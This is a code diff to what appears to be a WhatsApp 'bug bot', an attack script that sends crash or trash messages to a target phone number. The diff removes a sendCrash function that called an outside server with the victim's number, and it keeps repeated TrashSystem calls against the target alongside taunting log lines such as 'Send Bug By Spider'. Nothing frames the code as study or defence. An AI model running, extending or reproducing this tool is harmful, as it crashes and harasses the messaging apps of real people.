@@ -817,15 +817,7 @@ async function TrashSystem(target, spider, Ptcp = true) {
    );
    console.log(chalk.green("Send Bug By Spider〽️"));
   };
-async function sendCrash(target) {
-			try {
-				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + target);
-				console.log(chalk.green("Send Bug By SPIDER-V9"));
-				console.log(chalk.red("InVisible⚡"));
-			} catch (error) {
-				console.error("Error Fetching Crash:", error);
-			}
-		}
+
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
@@ -1222,9 +1214,8 @@ var contactInfo = await sam.onWhatsApp(target);
 }
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
-  await sendCrash(target)
  await TrashSystem(target, sam, ptcp = true)
-await TrashSystem(target, sam, ptcp = true)
+ await TrashSystem(target, sam, ptcp = true)
   
  
 reply(`
